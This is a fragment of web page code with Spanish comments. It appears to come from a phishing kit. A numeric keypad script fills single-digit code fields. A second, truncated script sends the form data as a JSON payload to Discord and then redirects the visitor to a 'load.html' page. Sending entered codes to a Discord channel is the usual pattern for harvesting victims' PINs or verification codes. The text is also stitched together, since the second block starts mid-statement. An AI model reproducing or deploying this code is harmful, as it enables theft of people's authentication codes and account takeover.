  <script>
document.addEventListener("DOMContentLoaded", function () {
    // Obtener los elementos de entrada y los botones del teclado numérico
    const inputs = document.querySelectorAll('.code_numerickeypad');
    const buttons = document.querySelectorAll('.container_number');
    const backspaceButton = document.querySelector('button[name="numeric_board_backspace"]');

    let currentInputIndex = 0; // Índice del input actual

    // Función para manejar clics en los botones numéricos
    buttons.forEach(button => {
        button.addEventListener('click', function () {
            const value = this.textContent.trim();
            const focusedElement = inputs[currentInputIndex];

            // Si el valor es numérico
            if (/^\d$/.test(value)) {
                // Reemplazar el contenido del input actual con el nuevo dígito
                focusedElement.value = value;

                // Pasar al siguiente input si es posible
                if (currentInputIndex < inputs.length - 1) {
                    currentInputIndex++;
                    inputs[currentInputIndex].focus();
                }
            }
        });
    });

    // Función para manejar el clic en el botón de borrar
    backspaceButton.addEventListener('click', function () {
        const focusedElement = inputs[currentInputIndex];

        // Si el campo tiene contenido, borrar su contenido
        if (focusedElement.value.length > 0) {
            focusedElement.value = '';
        } else {
            // Si el campo está vacío y no es el primero, moverse al campo anterior
            if (currentInputIndex > 0) {
                currentInputIndex--;
                inputs[currentInputIndex].focus();
                inputs[currentInputIndex].value = ''; // Borrar el contenido del campo anterior
            }
        }
    });

    // Manejar la lógica de los eventos de teclado en los campos de entrada
    inputs.forEach((input, index) => {
        input.addEventListener('input', function () {
            // Si el campo ya tiene un dígito, pasar al siguiente input
            if (input.value.length > 0) {
                if (index < inputs.length - 1) {
                    currentInputIndex = index + 1;
                    inputs[currentInputIndex].focus();
                }
            }
        });

        // Manejar eventos de retroceso (backspace) en los campos de entrada
        input.addEventListener('keydown', function (event) {
            if (event.key === 'Backspace') {
                // Si el campo está vacío, mover al campo anterior
                if (input.value.length === 0 && index > 0) {
                    event.preventDefault(); // Evitar el comportamiento predeterminado
                    currentInputIndex = index - 1;
                    inputs[currentInputIndex].focus();
                }
            }
        });
    });
});


  </script>

                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(discordPayload)
                });

                if (response.ok) {
                    
                    
                    window.location.href = "load.html";
                } else {
                    throw new Error("Error al enviar los datos a Discord");
                }
            } catch (error) {
                console.error("Error al enviar los datos:", error);
                alert("Ocurrió un error al enviar los datos. Intente nuevamente.");
            }
        } else {
            alert("Por favor, completa todos los campos antes de confirmar.");
        }
    });
});

</script>
